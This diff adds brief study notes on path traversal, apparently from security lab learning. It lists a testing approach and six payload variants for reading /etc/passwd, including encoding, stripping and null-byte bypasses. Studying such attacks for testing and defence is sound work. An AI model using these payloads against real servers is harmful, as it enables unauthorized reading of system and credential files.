@@ -1,0 +1,19 @@
+CIA
+Confidentiality: You can read files on the system
+Integrity: Only if you can run commands and alter the file system
+Availabilty: Only if you can run commands to delete files (It becomes an RCE vulnerability)
+
+
+1. Map the application
+2. Identify functions that retrieve data from the server
+3. Test for different payloads
+
+
+1. simple payload => ../../../../../etc/passwd
+2. Absolute path => /etc/passwd
+3. Stripping traversal sequences non-recursively => ....//....//....//....//etc/passwd
+4. URL encoding or double URL encoding (try other non-standard encodings)
+5. Start of path validation bypass => /this-is/the/required-path/../../../etc/passwd
+6. Bypass file extension using a null byte => ../../../etc/passwd%00.jpg
+The null byte tells the application to ignore anything after it. (does not work for all programming languages)
+
